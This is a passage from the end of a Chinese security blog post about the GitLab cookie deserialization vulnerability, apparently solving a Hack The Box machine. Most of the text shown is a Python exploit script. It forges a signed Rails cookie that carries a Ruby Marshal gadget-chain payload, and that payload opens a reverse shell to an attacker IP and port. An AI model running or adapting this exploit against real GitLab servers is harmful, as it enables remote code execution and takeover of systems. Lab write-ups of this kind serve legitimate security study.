              <span class="s2">&#34;:</span><span class="se">\f</span><span class="s2">@linenoi</span><span class="se">\x06</span><span class="s2">&#34;</span> <span class="p">\</span>
          <span class="s2">&#34;:</span><span class="se">\f</span><span class="s2">@method:</span><span class="se">\v</span><span class="s2">result&#34;</span> <span class="p">\</span>
          <span class="s2">&#34;:</span><span class="se">\t</span><span class="s2">@var</span><span class="se">\&#34;\f</span><span class="s2">@result&#34;</span> <span class="p">\</span>
        <span class="s2">&#34;:</span><span class="se">\x10</span><span class="s2">@deprecatorIu:</span><span class="se">\x1F</span><span class="s2">ActiveSupport::Deprecation</span><span class="se">\x00\x06</span><span class="s2">:</span><span class="se">\x06</span><span class="s2">ET&#34;</span>
</code></pre></div><p>不断的进行修改、测试、调试，反反复复，终于想到了一个好的办法。<!-- raw HTML omitted -->用ruby生成的序列化后的payload，这个过程在irb命令行上面写就能显示出特殊的编码：<!-- raw HTML omitted --><img src="https://cdn.nlark.com/yuque/0/2021/png/12507856/1617247420663-4ae6afad-1a99-41fe-96ea-c118252e2afd.png" alt="image.png"><!-- raw HTML omitted -->那这样就可以愉快的转到python上面执行了。<!-- raw HTML omitted -->下面是反弹shell的脚本：</p>
<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">hashlib</span> <span class="kn">import</span> <span class="n">pbkdf2_hmac</span><span class="p">,</span><span class="n">sha1</span>
<span class="kn">import</span> <span class="nn">base64</span>
<span class="kn">import</span> <span class="nn">hmac</span>
<span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">urllib3</span>
<span class="n">urllib3</span><span class="o">.</span><span class="n">disable_warnings</span><span class="p">()</span>
<span class="n">key</span> <span class="o">=</span> <span class="n">pbkdf2_hmac</span><span class="p">(</span>
    <span class="n">hash_name</span> <span class="o">=</span> <span class="s1">&#39;sha1&#39;</span><span class="p">,</span> 
    <span class="n">password</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;3231f54b33e0c1ce998113c083528460153b19542a70173b4458a21e845ffa33cc45ca7486fc8ebb6b2727cc02feea4c3adbe2cc7b65003510e4031e164137b3&#34;</span><span class="p">,</span> 
    <span class="n">salt</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;signed cookie&#34;</span><span class="p">,</span> 
    <span class="n">iterations</span> <span class="o">=</span> <span class="mi">1000</span><span class="p">,</span> 
    <span class="n">dklen</span> <span class="o">=</span> <span class="mi">64</span>
<span class="p">)</span>
<span class="n">ip</span> <span class="o">=</span> <span class="s1">&#39;10.10.14.8&#39;</span>
<span class="n">port</span> <span class="o">=</span> <span class="s1">&#39;4444&#39;</span>
<span class="n">code</span><span class="o">=</span><span class="s1">&#39;</span><span class="se">\x04\b</span><span class="s1">o:@ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy</span><span class="se">\t</span><span class="s1">:</span><span class="se">\x0E</span><span class="s1">@instanceo:</span><span class="se">\b</span><span class="s1">ERB</span><span class="se">\b</span><span class="s1">:</span><span class="se">\t</span><span class="s1">@srcI</span><span class="se">\&#34;\x01\x80</span><span class="s1">`ruby -rsocket -e </span><span class="se">\&#39;</span><span class="s1">exit if fork;c=TCPSocket.new(</span><span class="se">\&#34;</span><span class="s1">&#39;</span><span class="o">+</span><span class="n">ip</span><span class="o">+</span><span class="s1">&#39;</span><span class="se">\&#34;</span><span class="s1">,&#39;</span><span class="o">+</span><span class="n">port</span><span class="o">+</span><span class="s1">&#39;);while(cmd=c.gets);IO.popen(cmd,</span><span class="se">\&#34;</span><span class="s1">r</span><span class="se">\&#34;</span><span class="s1">){|io|c.print io.read}end</span><span class="se">\&#39;</span><span class="s1">`</span><span class="se">\x06</span><span class="s1">:</span><span class="se">\x06</span><span class="s1">ET:</span><span class="se">\x0E</span><span class="s1">@filenameI</span><span class="se">\&#34;\x06</span><span class="s1">1</span><span class="se">\x06</span><span class="s1">;</span><span class="se">\t</span><span class="s1">T:</span><span class="se">\f</span><span class="s1">@linenoi</span><span class="se">\x06</span><span class="s1">:</span><span class="se">\f</span><span class="s1">@method:</span><span class="se">\v</span><span class="s1">result:</span><span class="se">\t</span><span class="s1">@varI</span><span class="se">\&#34;\f</span><span class="s1">@result</span><span class="se">\x06</span><span class="s1">;</span><span class="se">\t</span><span class="s1">T:</span><span class="se">\x10</span><span class="s1">@deprecatorIu:</span><span class="se">\x1F</span><span class="s1">ActiveSupport::Deprecation</span><span class="se">\x00\x06</span><span class="s1">;</span><span class="se">\t</span><span class="s1">T&#39;</span>

<span class="n">cookie_signature</span> <span class="o">=</span> <span class="n">hmac</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">code</span><span class="p">),</span> <span class="n">sha1</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">=</span><span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">code</span><span class="p">)</span><span class="o">+</span><span class="s1">&#39;--&#39;</span><span class="o">+</span><span class="n">h</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>
<span class="n">cookies</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;experimentation_subject_id&#39;</span><span class="p">:</span><span class="n">payload</span><span class="p">}</span>
<span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;https://git.laboratory.htb/users/sign_in&#34;</span><span class="p">,</span><span class="n">cookies</span><span class="o">=</span><span class="n">cookies</span><span class="p">,</span><span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
<span class="k">print</span> <span class="n">payload</span>

</code></pre></div><p><!-- raw HTML omitted --><!-- raw HTML omitted --></p>
<h1 id="0x05-结束">0x05 结束</h1>
<p>搞这个问题弄了我两天两夜，问题的根源还是来自自己的技术太菜了。。。</p>

    </article>

    
    <div class="prevnext">
        



<ul class="prevnext">
    
    <li>上一篇：
        <a href="https://getshe11.com/post/kali-install-clash/">
            Kali Linux安装Clash
        </a>
    </li>
    
    
</ul>

    </div>
    
    <div class="post-comments">
        
  
  

  
    <script src="https://utteranc.es/client.js"
            repo="F0r3at/Getshe11.com"
            issue-term="pathname"
            theme="github-light"
            crossorigin="anonymous"
            async>
    </script>
    <noscript>Please enable JavaScript to view the <a href="https://github.com/utterance">comments powered by utterances.</a></noscript>

    </div>
</div>
            </div>
            
            <div class="col-second">
                <div class="col-box col-box-author">
    <img class="avatar" src="../../images/avatar.jpg" alt="F0rmat">
    <div class="col-box-title name">F0rmat</div>
    <p>Stay Hungry, Stay Foolish.</p>
    <p class="contact">
        <a href="http://github.com/F0r3at">Github</a>
    </p>
</div>

<div class="col-box">
    <div class="col-box-title">Newest Posts</div>
    <ul class="post-list">
        
        <li>
            <a href="https://getshe11.com/post/research-on-gitlab-cookie-deserialization-vulnerability/" class="post-link">Gitlab Cookie 反序列化漏洞研究</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/kali-install-clash/" class="post-link">Kali Linux安装Clash</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/pd-chrome-3d/" class="post-link">关于Kali2020安装Parallels Tools后Chrome显示空白</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/install-parallels-tools-on-kali-linux-2020.4/" class="post-link">Kali Linux 2020.4安装Parallels Tools</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/pathfinder/" class="post-link">Hackthebox-Pathfinder</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/domain-security/" class="post-link">Windows认证与域渗透</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/shield/" class="post-link">Hackthebox-Shield</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/archetype/" class="post-link">Hackthebox-Archetype</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/oopsie/" class="post-link">Hackthebox-Oopsie</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/vaccine/" class="post-link">Hackthebox-Vaccine</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/bc-penetration-diary/" class="post-link">Bc站渗透日记</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/maccms8-latest-command-execution-vulnerability/" class="post-link">Maccms8最新命令执行漏洞</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/seacms9.92-from-variable-override-to-getshell/" class="post-link">Seacms9.92从变量覆盖到getshell</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/seacms-front-desk-getshell/" class="post-link">Seacms&lt;=9.92前台Getshell</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/a-difficult-penetration-process/" class="post-link">一次艰难的渗透提权过程</a>
        </li>
        
    </ul>
</div>

<div class="col-box post-toc hide">
    <div class="col-box-title">TOC</div>
</div>
            </div>
        </div>
    </div>
    
    <footer class="footer">
        <div class="wrapper">
    © 2021    <a href="https://getshe11.com/">F0rmat</a>
</div>
    </footer>
    
    
<script src="https://cdn.jsdelivr.net/npm/jquery@1.11.0/dist/jquery.min.js"></script>

<script src="/js/easybook.js"></script>

<script src="/js/lazysizes.min.js"></script>

<script src="https://cdn.jsdelivr.net/npm/lightgallery@1.6.12/dist/js/lightgallery-all.min.js"></script>
<script src="/js/figure.js"></script>


<script type="application/javascript">
var doNotTrack = false;
if (!doNotTrack) {
	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
	ga('create', 'UA-XXXXXXXX-X', 'auto');
	
	ga('send', 'pageview');
}
</script>
<script async src='https://www.google-analytics.com/analytics.js'></script>






</body>

</html>